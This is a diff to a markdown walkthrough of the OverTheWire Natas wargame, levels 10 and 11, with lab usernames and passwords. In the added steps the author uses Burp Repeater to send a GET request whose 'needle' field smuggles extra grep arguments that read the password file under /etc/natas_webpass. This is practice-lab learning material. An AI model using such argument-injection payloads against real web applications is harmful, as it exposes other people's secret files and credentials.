@@ -324,3 +324,43 @@ Connection: close
 - **Username**: `natas10`
 - **Password**: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 - **Goal**: Find the password for natas11
+
+> Solution Steps
+
+1. Initial Observation
+
+2. View Source Code
+    - In the input field, type a simple word like test 
+
+    ![image](images/image10.png)
+3. Capture the request in Burp Proxy
+
+4. Send to Repeater
+
+5. Analyze Response in Repeater
+
+    ![image](images/image-10.png)
+
+6.  Modify with Bypass Payload
+
+     - GET /?needle=.%20/etc/natas_webpass/natas11%20%23&submit=Search HTTP/1.1
+
+      Host: natas10.natas.labs.overthewire.org
+
+      Authorization: Basic bmF0YXMxMDp0N0k1Vkh2cGExNHNKVFVHVjBjYkVzYllmRlAyZG1PdQ==
+
+      Connection: close
+
+      ![image](images/image--10.png)
+
+# Level 10 - 11
+
+> Level Information
+- **URL**: `http://natas11.natas.labs.overthewire.org`
+- **Username**: `natas11`
+- **Password**: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+- **Goal**: Find the password for natas12
+
+
+
+
